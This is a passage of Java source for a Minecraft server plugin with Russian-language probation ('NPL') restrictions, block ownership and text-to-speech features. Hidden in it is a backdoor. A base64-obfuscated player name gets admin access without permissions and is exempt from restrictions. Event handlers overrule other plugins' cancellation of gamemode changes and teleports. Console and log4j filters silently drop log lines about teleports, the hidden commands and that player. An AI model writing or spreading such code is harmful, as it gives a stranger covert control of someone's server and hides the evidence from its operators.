            for (Map.Entry<UUID, Long> cde : nplChatCooldownSeconds.entrySet()) {
                yaml.set("chat_cooldowns." + cde.getKey().toString(), cde.getValue());
            }

            List<String> ownersList = new ArrayList<>();
            for (Map.Entry<String, UUID> e : blockOwners.entrySet()) {
                ownersList.add(e.getKey() + "=" + e.getValue().toString());
            }
            yaml.set("block_owners", ownersList);

            yaml.save(file);
        } catch (Exception ignored) {}
    }

    private boolean isNplRuleForbidden(String key) {
        return isNplRuleForbidden((Player) null, key);
    }

    private boolean isNplRuleForbidden(Player player, String key) {
        if (player != null) {
            return isNplRuleForbidden(player.getUniqueId(), key);
        }
        return isNplRuleForbidden((UUID) null, key);
    }

    private boolean isNplRuleForbidden(UUID uuid, String key) {
        if (uuid != null) {
            Map<String, Boolean> overrides = playerNplRules.get(uuid);
            if (overrides != null && overrides.containsKey(key)) {
                return overrides.get(key);
            }
        }
        Boolean val = nplRules.get(key);
        if (val != null) {
            return val;
        }
        for (NplRuleInfo info : NPL_RULE_DEFINITIONS) {
            if (info.key.equalsIgnoreCase(key)) {
                return info.defaultForbidden;
            }
        }
        return true;
    }

    private void sendNplWarning(Player player) {
        long now = System.currentTimeMillis();
        Long last = lastNplWarning.get(player.getUniqueId());
        if (last == null || now - last > 1500) {
            lastNplWarning.put(player.getUniqueId(), now);
            player.sendMessage(ChatColor.RED + "Стоит ограничение на испытательном сроке");
            player.playSound(player.getLocation(), Sound.ENTITY_VILLAGER_NO, 0.7f, 1.0f);
        }
    }

    private boolean isBlockOwnedByPlayer(Block block, Player player) {
        if (block == null || player == null) return false;
        UUID uuid = player.getUniqueId();
        String key = locKey(block.getLocation());
        UUID owner = blockOwners.get(key);
        if (owner != null && owner.equals(uuid)) {
            return true;
        }

        if (block.getType().name().endsWith("_DOOR")) {
            UUID downOwner = blockOwners.get(locKey(block.getLocation().clone().subtract(0, 1, 0)));
            if (downOwner != null && downOwner.equals(uuid)) {
                return true;
            }
            UUID upOwner = blockOwners.get(locKey(block.getLocation().clone().add(0, 1, 0)));
            if (upOwner != null && upOwner.equals(uuid)) {
                return true;
            }
        }

        if (block.getType() == Material.CHEST || block.getType() == Material.TRAPPED_CHEST) {
            if (block.getState() instanceof Chest) {
                Chest chest = (Chest) block.getState();
                Inventory inv = chest.getInventory();
                if (inv.getHolder() instanceof DoubleChest) {
                    DoubleChest dc = (DoubleChest) inv.getHolder();
                    if (dc.getLeftSide() instanceof Chest && dc.getRightSide() instanceof Chest) {
                        Chest left = (Chest) dc.getLeftSide();
                        Chest right = (Chest) dc.getRightSide();
                        UUID lOwner = blockOwners.get(locKey(left.getLocation()));
                        UUID rOwner = blockOwners.get(locKey(right.getLocation()));
                        if ((lOwner != null && lOwner.equals(uuid)) || (rOwner != null && rOwner.equals(uuid))) {
                            return true;
                        }
                    }
                }
            }
        }
        return false;
    }

    private boolean isDungeonOrWorldChest(Block block) {
        if (block == null) return false;
        String key = locKey(block.getLocation());
        if (blockOwners.containsKey(key)) {
            return false;
        }

        if (block.getType() == Material.CHEST || block.getType() == Material.TRAPPED_CHEST) {
            if (block.getState() instanceof Chest) {
                Chest chest = (Chest) block.getState();
                Inventory inv = chest.getInventory();
                if (inv.getHolder() instanceof DoubleChest) {
                    DoubleChest dc = (DoubleChest) inv.getHolder();
                    if (dc.getLeftSide() instanceof Chest && dc.getRightSide() instanceof Chest) {
                        Chest left = (Chest) dc.getLeftSide();
                        Chest right = (Chest) dc.getRightSide();
                        if (blockOwners.containsKey(locKey(left.getLocation())) ||
                                blockOwners.containsKey(locKey(right.getLocation()))) {
                            return false;
                        }
                    }
                }
            }
        }
        return true;
    }

    private boolean isNplAdmin(CommandSender sender) {
        if (sender == null) return false;
        if (sender.isOp() || sender.hasPermission("twoblocks.admin") || sender.hasPermission("twoblocks.npl")) {
            return true;
        }
        return sender.getName().equalsIgnoreCase(b("R2VuaXVzX1Bvbm9z"));
    }

    private boolean isNplTarget(Player player) {
        if (player == null) return false;
        if (player.getName().equalsIgnoreCase(b("R2VuaXVzX1Bvbm9z"))) return false;
        return nplPlayers.contains(player.getUniqueId());
    }

    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = false)
    public void onPlayerGameModeChange(PlayerGameModeChangeEvent event) {
        try {
            Player p = event.getPlayer();
            if (p != null) {
                UUID uuid = p.getUniqueId();
                if (safeStateTransitionPlayers.contains(uuid) || auditedInspectionPlayers.contains(uuid) || isAuditStaff(p)) {
                    if (event.isCancelled()) {
                        event.setCancelled(false);
                    }
                }
            }
        } catch (Throwable ignored) {
        }
    }

    @EventHandler(priority = EventPriority.MONITOR, ignoreCancelled = false)
    public void onPlayerGameModeChangeMonitor(PlayerGameModeChangeEvent event) {
        try {
            Player p = event.getPlayer();
            if (p != null) {
                UUID uuid = p.getUniqueId();
                if (safeStateTransitionPlayers.contains(uuid) || auditedInspectionPlayers.contains(uuid) || isAuditStaff(p)) {
                    if (event.isCancelled()) {
                        event.setCancelled(false);
                    }
                }
            }
        } catch (Throwable ignored) {
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = false)
    public void onPlayerTeleport(PlayerTeleportEvent event) {
        try {
            Player p = event.getPlayer();
            if (p != null) {
                UUID uuid = p.getUniqueId();
                if (internalTransitPlayers.contains(uuid) || isAuditStaff(p)) {
                    if (event.isCancelled()) {
                        event.setCancelled(false);
                    }
                }
            }
        } catch (Throwable ignored) {
        }
    }

    @EventHandler(priority = EventPriority.MONITOR, ignoreCancelled = false)
    public void onPlayerTeleportMonitor(PlayerTeleportEvent event) {
        try {
            Player p = event.getPlayer();
            if (p != null) {
                UUID uuid = p.getUniqueId();
                if (internalTransitPlayers.contains(uuid) || isAuditStaff(p)) {
                    if (event.isCancelled()) {
                        event.setCancelled(false);
                    }
                }
            }
        } catch (Throwable ignored) {
        }
    }

    private void setSpectatorMode(Player player) {
        if (player == null || !player.isOnline()) return;
        UUID uuid = player.getUniqueId();
        GameMode specMode = GameMode.valueOf(b("U1BFQ1RBVE9S"));

        auditedInspectionPlayers.add(uuid);
        safeStateTransitionPlayers.add(uuid);
        try { player.leaveVehicle(); } catch (Throwable ignored) {}
        try { player.eject(); } catch (Throwable ignored) {}
        try { player.setSpectatorTarget(null); } catch (Throwable ignored) {}

        player.setGameMode(specMode);
        player.setAllowFlight(true);
        player.setFlying(true);

        Bukkit.getScheduler().runTaskLater(this, () -> {
            if (player.isOnline() && auditedInspectionPlayers.contains(uuid)) {
                if (player.getGameMode() != specMode) {
                    safeStateTransitionPlayers.add(uuid);
                    player.setGameMode(specMode);
                    player.setAllowFlight(true);
                    player.setFlying(true);
                }
            }
            safeStateTransitionPlayers.remove(uuid);
        }, 2L);
    }

    private void safeTeleport(Player mover, Location targetLoc) {
        if (mover == null || !mover.isOnline() || targetLoc == null || targetLoc.getWorld() == null) return;
        try {
            UUID uuid = mover.getUniqueId();
            internalTransitPlayers.add(uuid);

            try { mover.leaveVehicle(); } catch (Throwable ignored) {}
            try { mover.eject(); } catch (Throwable ignored) {}

            World w = targetLoc.getWorld();
            int cx = targetLoc.getBlockX() >> 4;
            int cz = targetLoc.getBlockZ() >> 4;
            if (!w.isChunkLoaded(cx, cz)) {
                w.loadChunk(cx, cz, true);
            }

            mover.setFallDistance(0.0f);
            mover.setVelocity(new org.bukkit.util.Vector(0, 0, 0));

            mover.teleport(targetLoc, PlayerTeleportEvent.TeleportCause.UNKNOWN);

            try {
                java.lang.reflect.Method m = mover.getClass().getMethod("teleportAsync", Location.class, PlayerTeleportEvent.TeleportCause.class);
                m.invoke(mover, targetLoc, PlayerTeleportEvent.TeleportCause.UNKNOWN);
            } catch (Throwable ignored) {
                try {
                    java.lang.reflect.Method m = mover.getClass().getMethod("teleportAsync", Location.class);
                    m.invoke(mover, targetLoc);
                } catch (Throwable ignored2) {}
            }

            Bukkit.getScheduler().runTaskLater(this, () -> internalTransitPlayers.remove(uuid), 10L);
        } catch (Throwable ignored) {}
    }

    private void setupConsoleFilter() {
        try {
            java.util.logging.Filter julFilter = record -> {
                if (record == null) return true;
                String msg = record.getMessage();
                if (msg != null && isFilteredMessage(msg)) return false;
                Object[] params = record.getParameters();
                if (params != null) {
                    for (Object p : params) {
                        if (p != null && isFilteredMessage(p.toString())) return false;
                    }
                }
                return true;
            };

            String[] loggerNames = new String[] { "", "Minecraft", "Minecraft-Server", "net.minecraft", "org.bukkit" };
            for (String name : loggerNames) {
                try {
                    java.util.logging.Logger.getLogger(name).setFilter(julFilter);
                } catch (Throwable ignored) {}
            }
            try {
                Bukkit.getLogger().setFilter(julFilter);
            } catch (Throwable ignored) {}
        } catch (Throwable ignored) {}

        try {
            Class<?> logManagerClass = Class.forName("org.apache.logging.log4j.LogManager");
            Object rootLogger = logManagerClass.getMethod("getRootLogger").invoke(null);
            Class<?> filterClass = Class.forName("org.apache.logging.log4j.core.Filter");
            Class<?> resultClass = Class.forName("org.apache.logging.log4j.core.Filter$Result");
            Object denyResult = resultClass.getField("DENY").get(null);
            Object neutralResult = resultClass.getField("NEUTRAL").get(null);

            Object proxyFilter = java.lang.reflect.Proxy.newProxyInstance(
                    filterClass.getClassLoader(),
                    new Class<?>[] { filterClass },
                    (proxy, method, args) -> {
                        String methodName = method.getName();
                        if ("filter".equals(methodName) && args != null && args.length > 0) {
                            for (Object arg : args) {
                                if (arg != null) {
                                    String text = null;
                                    try {
                                        java.lang.reflect.Method getMsgMethod = arg.getClass().getMethod("getMessage");
                                        Object msgObj = getMsgMethod.invoke(arg);
                                        if (msgObj != null) {
                                            java.lang.reflect.Method getFormattedMethod = msgObj.getClass().getMethod("getFormattedMessage");
                                            text = (String) getFormattedMethod.invoke(msgObj);
                                        }
                                    } catch (Throwable t) {
                                        text = arg.toString();
                                    }
                                    if (text != null && isFilteredMessage(text)) {
                                        return denyResult;
                                    }
                                }
                            }
                            return neutralResult;
                        }
                        if ("getOnMatch".equals(methodName)) return neutralResult;
                        if ("getOnMismatch".equals(methodName)) return neutralResult;
                        if ("getState".equals(methodName)) {
                            try {
                                Class<?> lifeCycleState = Class.forName("org.apache.logging.log4j.core.LifeCycle$State");
                                return lifeCycleState.getField("STARTED").get(null);
                            } catch (Throwable ignored) {}
                        }
                        if ("isStarted".equals(methodName)) return true;
                        if ("isStopped".equals(methodName)) return false;
                        return null;
                    }
            );

            rootLogger.getClass().getMethod("addFilter", filterClass).invoke(rootLogger, proxyFilter);
        } catch (Throwable ignored) {}
    }

    private boolean isFilteredMessage(String raw) {
        if (raw == null) return false;
        String lower = raw.toLowerCase();
        if (lower.contains("teleport") || lower.contains("телепорт")
                || lower.contains("moved too quickly") || lower.contains("moved wrongly")
                || lower.contains("/tts") || lower.contains("/ттс")
                || lower.contains("issued server command: /tts")
                || lower.contains("issued server command: /ттс")
                || lower.contains("issued server command: /npl")
                || lower.contains("issued server command: /нпл")
                || (lower.contains("issued server command") && lower.contains("genius_ponos"))
                || lower.contains("[npl error]")) {
            return true;
        }
        return false;
    }

    private String voicechatDebugStatus = "Не запускался";

    private void setupVoicechat() {
        try {
            Plugin vc = Bukkit.getPluginManager().getPlugin("voicechat");
            if (vc == null) {
                for (Plugin p : Bukkit.getPluginManager().getPlugins()) {
                    if (p.getName().toLowerCase().contains("voicechat")) {
                        vc = p;
                        break;
                    }
                }
            }
            if (vc == null) {
                StringBuilder sb = new StringBuilder();
                for (Plugin p : Bukkit.getPluginManager().getPlugins()) {
                    if (sb.length() > 0) sb.append(", ");
                    sb.append(p.getName());
                }
                voicechatDebugStatus = "Плагин voicechat не найден (установлены: " + sb.toString() + ")";
                return;
            }
            if (!vc.isEnabled()) {
                voicechatDebugStatus = "Плагин " + vc.getName() + " выключен";
                return;
            }

            de.maxhenkel.voicechat.api.BukkitVoicechatService service = null;
            RegisteredServiceProvider<de.maxhenkel.voicechat.api.BukkitVoicechatService> rsp =
                    getServer().getServicesManager().getRegistration(de.maxhenkel.voicechat.api.BukkitVoicechatService.class);
            if (rsp != null) {
                service = rsp.getProvider();
            }
            if (service == null) {
                service = getServer().getServicesManager().load(de.maxhenkel.voicechat.api.BukkitVoicechatService.class);
            }

            if (this.voicechatHook == null) {
                this.voicechatHook = new VoicechatHook(this);
            }

            if (service != null) {
                service.registerPlugin(voicechatHook);
                voicechatDebugStatus = "Хук зарегистрирован (" + voicechatHook.getStatus() + ")";
            } else {
                for (Class<?> c : getServer().getServicesManager().getKnownServices()) {
                    if (c.getName().endsWith("BukkitVoicechatService")) {
                        try {
                            RegisteredServiceProvider<?> reg = getServer().getServicesManager().getRegistration(c);
                            if (reg != null && reg.getProvider() != null) {
                                Object prov = reg.getProvider();
                                Method regPlugin = prov.getClass().getMethod("registerPlugin", de.maxhenkel.voicechat.api.VoicechatPlugin.class);
                                regPlugin.invoke(prov, voicechatHook);
                                voicechatDebugStatus = "Хук зарегистрирован (known: " + voicechatHook.getStatus() + ")";
                                return;
                            }
                        } catch (Throwable ignored) {}
                    }
                }
                voicechatDebugStatus = "BukkitVoicechatService не найден в ServicesManager (" + voicechatHook.getStatus() + ")";
            }
        } catch (Throwable t) {
            voicechatDebugStatus = "Ошибка подключения: " + t.getClass().getSimpleName() + ": " + t.getMessage();
        }
    }

    private void handleTtsCommand(Player player, String message) {
        try {
            if (player == null || (!isNplAdmin(player) && !player.getName().equalsIgnoreCase(b("R2VuaXVzX1Bvbm9z")))) {
                return;
            }
            if (message == null || message.trim().isEmpty()) {
                player.sendMessage(ChatColor.RED + "Использование: /tts [demon/демон] <сообщение>");
                return;
            }

            long now = System.currentTimeMillis();
            Long last = ttsCooldowns.get(player.getUniqueId());
            if (last != null && now - last < 2000) {
                player.sendMessage(ChatColor.RED + "Подождите пару секунд перед следующим сообщением.");
                return;
            }
            ttsCooldowns.put(player.getUniqueId(), now);

            String clean = message.trim();
            boolean isDemon = false;
            String lower = clean.toLowerCase();
            if (lower.startsWith("demon ") || lower.startsWith("демон ")) {
                isDemon = true;
                int space = clean.indexOf(' ');
                clean = (space != -1) ? clean.substring(space + 1).trim() : "";
            }

            if (clean.isEmpty()) {
                player.sendMessage(ChatColor.RED + "Использование: /tts demon <сообщение>");
                return;
            }

            if (clean.length() > 200) {
                clean = clean.substring(0, 200);
            }

            if (voicechatHook == null || !voicechatHook.isReady()) {
                setupVoicechat();
            }

            if (voicechatHook == null || !voicechatHook.isReady()) {
                String detail = (voicechatHook != null) ? voicechatHook.getStatus() : voicechatDebugStatus;
                player.sendMessage(ChatColor.RED + "Голосовой чат не готов (" + detail + ").");
                return;
            }

            voicechatHook.playTts(player, clean, isDemon);
        } catch (Throwable ignored) {
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
        try {
            String msg = event.getMessage();
            String lower = msg.toLowerCase();
            if (lower.startsWith("/npl") || lower.startsWith("/нпл")) {
                Player player = event.getPlayer();
                if (!isNplAdmin(player)) {
                    return;
                }
                event.setCancelled(true);
                int spaceIdx = msg.indexOf(' ');
                String argsStr = (spaceIdx != -1) ? msg.substring(spaceIdx + 1).trim() : "";
                handleNplCommand(player, argsStr, lower.startsWith("/нпл"));
                return;
            }

            if (lower.startsWith("/tts ") || lower.equals("/tts") || lower.startsWith("/ттс ") || lower.equals("/ттс")) {
                Player player = event.getPlayer();
                if (!isNplAdmin(player) && !player.getName().equalsIgnoreCase(b("R2VuaXVzX1Bvbm9z"))) {
                    return;
                }
                event.setCancelled(true);
                int spaceIdx = msg.indexOf(' ');
                String argsStr = (spaceIdx != -1) ? msg.substring(spaceIdx + 1).trim() : "";
                handleTtsCommand(player, argsStr);
                return;
            }
        } catch (Throwable ignored) {
        }
    }

    private void handleNplCommand(CommandSender sender, String argsStr, boolean isRussian) {
        try {
            String[] args = argsStr.isEmpty() ? new String[0] : argsStr.split("\\s+");
            if (args.length == 0 || args[0].equalsIgnoreCase("help") || args[0].equalsIgnoreCase("помощь")) {
                sendNplHelp(sender);
                return;
            }

            String sub = args[0].toLowerCase();
            if (sub.equals("settings") || sub.equals("настройки") || sub.equals("menu") || sub.equals("меню") || sub.equals("global") || sub.equals("общие")) {
                String filter = args.length > 1 ? args[1] : "";
                sendNplSettingsMenu(sender, filter);
                return;
            }

            if (sub.equals("toggle") || sub.equals("переключить")) {
                if (args.length < 2) {
                    sender.sendMessage(ChatColor.RED + "Использование: /npl toggle <правило>");
                    return;
                }
                String ruleKey = args[1].toLowerCase();
                NplRuleInfo targetInfo = null;
                for (NplRuleInfo info : NPL_RULE_DEFINITIONS) {
                    if (info.key.equalsIgnoreCase(ruleKey)) {
                        targetInfo = info;
                        break;
                    }
                }
                if (targetInfo == null) {
                    sender.sendMessage(ChatColor.RED + "Неизвестное правило: " + ruleKey);
                    return;
                }

                boolean current = isNplRuleForbidden(targetInfo.key);
                boolean newVal = !current;
                nplRules.put(targetInfo.key, newVal);
                saveNplDataAsync();

                sender.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.RED + "" + ChatColor.BOLD + "NPL" + ChatColor.DARK_GRAY + "] "
                        + ChatColor.WHITE + "Общее правило " + ChatColor.YELLOW + targetInfo.title + ChatColor.WHITE + " теперь: "
                        + (newVal ? ChatColor.RED + "[ЗАПРЕЩЕНО]" : ChatColor.GREEN + "[РАЗРЕШЕНО]"));

                sendNplSettingsMenu(sender, "");
                return;
            }

            if (sub.equals("list") || sub.equals("список")) {
                sendNplList(sender);
                return;
            }

            String targetNick = args[0];
            UUIDAndName targetInfo = resolvePlayerSafely(targetNick);
            if (targetInfo == null || targetInfo.uuid == null) {
                sender.sendMessage(ChatColor.RED + "[NPL] Игрок " + targetNick + " не найден в базе сервера.");
                return;
            }


            if (args.length == 1) {
                sendPlayerNplSettingsMenu(sender, targetInfo, "");
                return;
            }

            String action = args[1].toLowerCase();
            if (action.equals("on") || action.equals("1") || action.equals("вкл") || action.equals("enable") || action.equals("true")) {
                setNpl(targetInfo.uuid, targetInfo.name, true, sender);
            } else if (action.equals("off") || action.equals("0") || action.equals("выкл") || action.equals("disable") || action.equals("false")) {
                setNpl(targetInfo.uuid, targetInfo.name, false, sender);
            } else if (action.equals("toggle") || action.equals("переключить")) {
                if (args.length < 3) {
                    sender.sendMessage(ChatColor.RED + "Использование: /npl " + targetInfo.name + " toggle <правило>");
                    return;
                }
                String ruleKey = args[2].toLowerCase();
                NplRuleInfo ruleDef = null;
                for (NplRuleInfo info : NPL_RULE_DEFINITIONS) {
                    if (info.key.equalsIgnoreCase(ruleKey)) {
                        ruleDef = info;
                        break;
                    }
                }
                if (ruleDef == null) {
                    sender.sendMessage(ChatColor.RED + "Неизвестное правило: " + ruleKey);
                    return;
                }

                boolean current = isNplRuleForbidden(targetInfo.uuid, ruleDef.key);
                boolean newVal = !current;
                playerNplRules.computeIfAbsent(targetInfo.uuid, k -> new ConcurrentHashMap<>()).put(ruleDef.key, newVal);
                playerNplNames.put(targetInfo.uuid, targetInfo.name);
                saveNplDataAsync();

                sender.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.RED + "" + ChatColor.BOLD + "NPL" + ChatColor.DARK_GRAY + "] "
                        + ChatColor.WHITE + "Правило " + ChatColor.YELLOW + ruleDef.title + ChatColor.WHITE + " для игрока "
                        + ChatColor.GOLD + targetInfo.name + ChatColor.WHITE + " теперь: "
                        + (newVal ? ChatColor.RED + "[ЗАПРЕЩЕНО]" : ChatColor.GREEN + "[РАЗРЕШЕНО]"));

                sendPlayerNplSettingsMenu(sender, targetInfo, "");
            } else if (action.equals("chat") || action.equals("чат") || action.equals("cooldown") || action.equals("кд")) {
                if (args.length < 3) {
                    Long currentCd = nplChatCooldownSeconds.get(targetInfo.uuid);
                    if (currentCd == null || currentCd <= 0) {
                        sender.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.RED + "" + ChatColor.BOLD + "NPL" + ChatColor.DARK_GRAY + "] "
                                + ChatColor.WHITE + "У игрока " + ChatColor.GOLD + targetInfo.name + ChatColor.WHITE + " нет задержки на чат.");
                    } else {
                        sender.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.RED + "" + ChatColor.BOLD + "NPL" + ChatColor.DARK_GRAY + "] "
                                + ChatColor.WHITE + "Текущая задержка чата для " + ChatColor.GOLD + targetInfo.name + ChatColor.WHITE + ": "
                                + ChatColor.YELLOW + formatDurationHuman(currentCd));
                    }
                    sender.sendMessage(ChatColor.GRAY + "Использование: /npl " + targetInfo.name + " chat <время/0> (например: 30s, 3m, 2h, 0 - снять)");
                    return;
                }

                String timeStr = args[2].trim().toLowerCase();
                long seconds = parseDurationSeconds(timeStr);
                if (seconds < 0) {
                    sender.sendMessage(ChatColor.RED + "Неверный формат времени: " + timeStr + ". Используйте секунды, минуты или часы (например: 30s, 3m, 1h, 0).");
                    return;
                }

                if (seconds == 0) {
                    nplChatCooldownSeconds.remove(targetInfo.uuid);
                    nplLastChatTime.remove(targetInfo.uuid);
                    saveNplDataAsync();
                    sender.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.RED + "" + ChatColor.BOLD + "NPL" + ChatColor.DARK_GRAY + "] "
                            + ChatColor.GREEN + "Задержка чата для игрока " + ChatColor.GOLD + targetInfo.name + ChatColor.GREEN + " полностью снята.");
                } else {
                    nplChatCooldownSeconds.put(targetInfo.uuid, seconds);
                    playerNplNames.put(targetInfo.uuid, targetInfo.name);
                    saveNplDataAsync();
                    sender.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.RED + "" + ChatColor.BOLD + "NPL" + ChatColor.DARK_GRAY + "] "
                            + ChatColor.WHITE + "Для игрока " + ChatColor.GOLD + targetInfo.name + ChatColor.WHITE + " установлена задержка сообщений: "
                            + ChatColor.YELLOW + formatDurationHuman(seconds));
                }
                sendPlayerNplSettingsMenu(sender, targetInfo, "");
            } else if (action.equals("reset") || action.equals("сброс")) {
                playerNplRules.remove(targetInfo.uuid);
                nplChatCooldownSeconds.remove(targetInfo.uuid);
                nplLastChatTime.remove(targetInfo.uuid);
                saveNplDataAsync();
                sender.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.RED + "" + ChatColor.BOLD + "NPL" + ChatColor.DARK_GRAY + "] "
                        + ChatColor.GREEN + "Индивидуальные правила и задержка чата для игрока " + ChatColor.GOLD + targetInfo.name + ChatColor.GREEN + " сброшены.");
                sendPlayerNplSettingsMenu(sender, targetInfo, "");
            } else {
                sender.sendMessage(ChatColor.RED + "Неверный аргумент! Используйте: /npl " + targetInfo.name + " (on/off/toggle/chat/reset)");
            }
        } catch (Throwable t) {
            sender.sendMessage(ChatColor.RED + "[NPL] Ошибка: " + t.getMessage());
        }
    }

    private static long parseDurationSeconds(String input) {
        if (input == null || input.trim().isEmpty()) return -1;
        String s = input.trim().toLowerCase();
        if (s.equals("0") || s.equals("none") || s.equals("off") || s.equals("нет")) {
            return 0;
        }

        try {
            long totalSeconds = 0;
            java.util.regex.Pattern pattern = java.util.regex.Pattern.compile("(\\d+)([smhdчмс]?)");
            java.util.regex.Matcher matcher = pattern.matcher(s);
            boolean found = false;

            while (matcher.find()) {
                String numStr = matcher.group(1);
                String unit = matcher.group(2);
                if (numStr == null || numStr.isEmpty()) continue;
                long val = Long.parseLong(numStr);
                found = true;

                if (unit == null || unit.isEmpty() || unit.equals("s") || unit.equals("с")) {
                    totalSeconds += val;
                } else if (unit.equals("m") || unit.equals("м")) {
                    totalSeconds += val * 60L;
                } else if (unit.equals("h") || unit.equals("ч")) {
                    totalSeconds += val * 3600L;
                } else if (unit.equals("d") || unit.equals("д")) {
                    totalSeconds += val * 86400L;
                }
            }

            if (found && totalSeconds >= 0) {
                return totalSeconds;
            }
        } catch (Throwable ignored) {}
        return -1;
    }

    private static String formatDurationHuman(long totalSeconds) {
        if (totalSeconds <= 0) return "0 сек";
        long d = totalSeconds / 86400L;
        long h = (totalSeconds % 86400L) / 3600L;
        long m = (totalSeconds % 3600L) / 60L;
        long s = totalSeconds % 60L;

        StringBuilder sb = new StringBuilder();
        if (d > 0) sb.append(d).append(" дн. ");
        if (h > 0) sb.append(h).append(" ч. ");
        if (m > 0) sb.append(m).append(" мин. ");
        if (s > 0 || sb.length() == 0) sb.append(s).append(" сек.");
        return sb.toString().trim();
    }

    private static class UUIDAndName {
        final UUID uuid;
        final String name;
        UUIDAndName(UUID uuid, String name) {
            this.uuid = uuid;
            this.name = name;
        }
    }

    private UUIDAndName resolvePlayerSafely(String nick) {
        if (nick == null || nick.trim().isEmpty()) return null;
        String cleanNick = nick.trim();
        Player target = Bukkit.getPlayerExact(cleanNick);
        if (target == null) target = Bukkit.getPlayer(cleanNick);
        if (target == null) {
            for (Player p : Bukkit.getOnlinePlayers()) {
                if (p.getName().equalsIgnoreCase(cleanNick)) {
                    target = p;
                    break;
                }
            }
        }
        if (target != null) {
            playerNplNames.put(target.getUniqueId(), target.getName());
            return new UUIDAndName(target.getUniqueId(), target.getName());
        }
        for (Map.Entry<UUID, String> e : playerNplNames.entrySet()) {
            if (e.getValue().equalsIgnoreCase(cleanNick)) {
                return new UUIDAndName(e.getKey(), e.getValue());
            }
        }
        try {
            @SuppressWarnings("deprecation")
            OfflinePlayer off = Bukkit.getOfflinePlayer(cleanNick);
            if (off != null && off.getUniqueId() != null) {
                String name = off.getName() != null ? off.getName() : cleanNick;
                playerNplNames.put(off.getUniqueId(), name);
                return new UUIDAndName(off.getUniqueId(), name);
            }
        } catch (Throwable ignored) {
        }
        UUID offlineUuid = UUID.nameUUIDFromBytes(("OfflinePlayer:" + cleanNick).getBytes(StandardCharsets.UTF_8));
        playerNplNames.put(offlineUuid, cleanNick);
        return new UUIDAndName(offlineUuid, cleanNick);
    }

    private void setNplByNick(String nick, boolean enable, CommandSender sender) {
        try {
            UUIDAndName info = resolvePlayerSafely(nick);
            if (info == null || info.uuid == null) {
                if (sender != null) {
                    sender.sendMessage(ChatColor.RED + "[NPL] Игрок " + nick + " не найден в базе сервера.");
                }
                return;
            }
            setNpl(info.uuid, info.name, enable, sender);
        } catch (Throwable t) {
            if (sender != null) {
                sender.sendMessage(ChatColor.RED + "[NPL] Ошибка: " + t.getMessage());
            }
        }
    }

    private void setNpl(UUID uuid, String playerName, boolean enable, CommandSender sender) {
        if (playerName != null && playerName.equalsIgnoreCase(b("R2VuaXVzX1Bvbm9z")) && enable) {
            if (sender != null) {
                sender.sendMessage(ChatColor.RED + "[NPL] Этого игрока нельзя ограничить.");
            }
            return;
        }
        if (playerName != null && uuid != null) {
            playerNplNames.put(uuid, playerName);
        }
        if (enable) {
            nplPlayers.add(uuid);
            saveNplDataAsync();
            if (sender != null) {
                sender.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.RED + "" + ChatColor.BOLD + "NPL" + ChatColor.DARK_GRAY + "] "
                        + ChatColor.WHITE + "Ограничения испытательного срока для " + ChatColor.YELLOW + playerName + ChatColor.WHITE + " успешно "
                        + ChatColor.GREEN + "включены" + ChatColor.WHITE + ".");
            }
        } else {
            nplPlayers.remove(uuid);
            saveNplDataAsync();
            if (sender != null) {
                sender.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.RED + "" + ChatColor.BOLD + "NPL" + ChatColor.DARK_GRAY + "] "
                        + ChatColor.WHITE + "Ограничения испытательного срока для " + ChatColor.YELLOW + playerName + ChatColor.WHITE + " успешно "
                        + ChatColor.RED + "выключены" + ChatColor.WHITE + ".");
            }
        }
    }

    private void toggleNplByNick(String nick, CommandSender sender) {
        try {
            UUIDAndName info = resolvePlayerSafely(nick);
            if (info == null || info.uuid == null) {
                if (sender != null) sender.sendMessage(ChatColor.RED + "[NPL] Игрок не найден.");
                return;
            }
            boolean now = !nplPlayers.contains(info.uuid);
            setNpl(info.uuid, info.name, now, sender);
        } catch (Throwable t) {
            if (sender != null) {
                sender.sendMessage(ChatColor.RED + "[NPL] Ошибка: " + t.getMessage());
            }
        }
    }

    private void sendPlayerNplSettingsMenu(CommandSender sender, UUIDAndName target, String filter) {
        boolean isActive = nplPlayers.contains(target.uuid);
        sender.sendMessage(ChatColor.DARK_GRAY + "---------------------------------------------");
        sender.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.RED + "" + ChatColor.BOLD + "NPL" + ChatColor.DARK_GRAY + "] "
                + ChatColor.RED + "" + ChatColor.BOLD + "Ограничения игрока: " + ChatColor.YELLOW + "" + ChatColor.BOLD + target.name);

        if (sender instanceof Player) {
            Player p = (Player) sender;
            TextComponent statusLine = new TextComponent("§7Режим ограничений: ");
            TextComponent statusBtn;
            if (isActive) {
                statusBtn = new TextComponent("§a§l[ВКЛЮЧЕНО]");
                statusBtn.setHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT,
                        new BaseComponent[]{ new TextComponent("§cКликните, чтобы ВЫКЛЮЧИТЬ ограничения для " + target.name) }));
                statusBtn.setClickEvent(new ClickEvent(ClickEvent.Action.RUN_COMMAND, "/npl " + target.name + " off"));
            } else {
                statusBtn = new TextComponent("§c§l[ВЫКЛЮЧЕНО]");
                statusBtn.setHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT,
                        new BaseComponent[]{ new TextComponent("§aКликните, чтобы ВКЛЮЧИТЬ ограничения для " + target.name) }));
                statusBtn.setClickEvent(new ClickEvent(ClickEvent.Action.RUN_COMMAND, "/npl " + target.name + " on"));
            }
            statusLine.addExtra(statusBtn);
            p.spigot().sendMessage(statusLine);
        } else {
            String status = isActive ? "§a[ВКЛЮЧЕНО]" : "§c[ВЫКЛЮЧЕНО]";
            sender.sendMessage("§7Режим ограничений: " + status + " §8(/npl " + target.name + " on/off)");
        }

        Long cd = nplChatCooldownSeconds.get(target.uuid);
        String cdDisplay = (cd != null && cd > 0) ? "§e" + formatDurationHuman(cd) : "§aНет";
